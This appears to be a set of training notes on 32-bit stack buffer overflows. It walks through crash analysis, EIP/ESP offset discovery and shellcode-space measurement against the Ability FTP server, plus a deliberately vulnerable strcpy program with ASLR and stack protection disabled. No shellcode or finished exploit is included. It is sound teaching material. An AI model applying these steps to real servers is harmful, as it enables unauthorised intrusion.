# Registers

## Overview

CPU registers act like variables for quick access. On 32-bit machines, each register is 4 bytes.

EAX accumulator — calculations and function return values; add, subtract, compare
EBX base index — general data storage
ECX counter — byte counts and loop operations
EDX data — extension of EAX for multiply/divide; I/O pointer
EDI destination index — where data operation results are stored
ESI source index — input data location
EBP stack data pointer
ESP stack pointer — usually current stack location
EIP extended instruction pointer — next instruction to execute


# Endianness and Memory

Big Endian Unix — read from left to right
Little Endian x86 — read from right to left

Program memory is LIFO (last in, first out):

0xBFFFFFFF (higher memory)
Stack — function arguments and local variables
Unused memory
Heap — dynamic memory
.bss — uninitialized data
.data — initialized data
.text — program code
0x8048000 (lower memory)


# Stack Instructions

JMP — non-conditional jump
JNE — conditional jump
POP — remove topmost stack value
PUSH — push value onto stack

# BOF Checklist

Which 4 bytes overwrite EIP?
Do we have enough space in buffer for shellcode?
Is shellcode easily accessible in memory?
Does the application filter out any characters?
Will we encounter overflow protection mechanisms?


# Ability Server Crash Analysis

## Overview

Ability FTP server lab — OllyDbg attach and first crash with 2000 As.

## Commands

Start the Ability FTP server.
Open OllyDbg and attach the executable.
File > Attach > select Ability Server in the second column > Attach
Press Play — bottom right changes from Paused to Running.
Run the exploit.

Debugger catches the crash and shows CPU registers at crash time. EIP is overwritten by the buffer — hijack execution flow and redirect to attacker shellcode (usually placed in the buffer).

EIP overwritten with 41414141 (4 As).
ESP holds the rest of the malicious buffer.
Right-click ESP > Follow in Dump — bottom left shows ESP contents; address matches memory dump.
Quit OllyDbg.


# Ability Server EIP Offset

## Commands

Create a 2000-byte pattern:
    cd /usr/share/metasploit-framework/tools/exploit
    ./pattern_create.rb 2000

Copy pattern and replace the buffer that contained 2000 As.
Start Ability FTP server, attach in OllyDbg, Play, run exploit.
EIP overwrite value this run: 67423267

Find offset in pattern:
    ./pattern_offset.rb 67423267 2000

967 — EIP overwritten from 967th through 971st character.


# Ability Server ESP Offset

## Commands

Find ESP string position in the 2000-byte buffer — use first 4 bytes visible at ESP:
    ./pattern_offset.rb Bg9B

987


# Ability Server Buffer Layout

## Overview

Confirm EIP and ESP regions with distinct fill bytes.

## Commands

Hex fills:
    A = \x41
    B = \x42
    C = \x43
    D = \x44
    NOP = \x90                          no operation — slide into shellcode

New buffer:  A * 967 + B * 4 + C * 16 + D * 1013
    967 + 4 = 971
    987 - 971 = 16
    2000 - 987 = 1013

OllyDbg > Restart > Yes > Play, run exploit.
EIP = all Bs (42424242).
ESP > Follow in Dump — ESP region shows Ds.


# Ability Server Shellcode Space

## Commands

Copy ESP start address from lower left (example 00C3B6B8).
Scroll until error — copy line before error (example 00C3BA98).
Subtract: 00C3BA98 - 00C3B6B8 = 0x3E0 (992 decimal) — space available for shellcode.


# Bad Characters

NULL bytes terminate network buffers — avoid in payloads.
Encode shellcode when bad chars present:
    msfencode                             legacy encoder
    msfvenom -e <encoder>                 modern equivalent — encoded size grows each pass


# Linux strcpy Lab

## Overview

Local 32-bit vuln with strcpy, ASLR disabled, stack protector off. Lab only.

## Commands

Disable ASLR:
    echo 0 > /proc/sys/kernel/randomize_va_space

vuln.c:

#include <cstring>
int main(int argc, char **argv)
{
char buffer[500];
strcpy(buffer, argv[1]);
return 0;
}

Compile without stack protector (32-bit oriented flags):
    g++ vuln.c -fno-stack-protector -mpreferred-stack-boundary=2 -o vuln

Crash sizing:
    ./vuln test
    ./vuln $(python3 -c "print('A'*100)")
    ./vuln $(python3 -c "print('A'*500)")
    ./vuln $(python3 -c "print('A'*1000)")          # segmentation fault

GDB:
    apt install gdb
    gdb -q vuln
    run $(python3 -c "print('A'*1000)")

    info registers                      show all registers
    s                                   step
    c                                   continue past breakpoint
    quit

Pattern (second terminal):
    cd /usr/share/metasploit-framework/tools/exploit
    ./pattern_create.rb 1000

Tab 1:
    run <random string>
    y
    Copy crash address excluding 0x prefix

Tab 2:
    ./pattern_offset.rb <memory address>
    504

Tab 1:
    disassemble main
    break *0x080484e7                   after strcpy — address varies per build
    run $(python3 -c "print('A'*504 + 'B'*4)")
    y
    x/16wx $esp                         examine 16 words hex at stack pointer
    info registers


# Validation / False Positives

Ability offsets (967, 987, 0x3E0, 67423267) are lab-specific — rerun pattern_create/offset for each binary rebuild.
Linux break address 0x080484e7 and offset 504 are compile/layout specific — disassemble main to confirm.
ASLR disable and -fno-stack-protector are lab-only — never assume on production targets.
32-bit EIP overwrite does not translate directly to 64-bit RIP exploitation — separate technique set.
OllyDbg/Immunity are Windows; GDB example is Linux — match debugger to target platform.
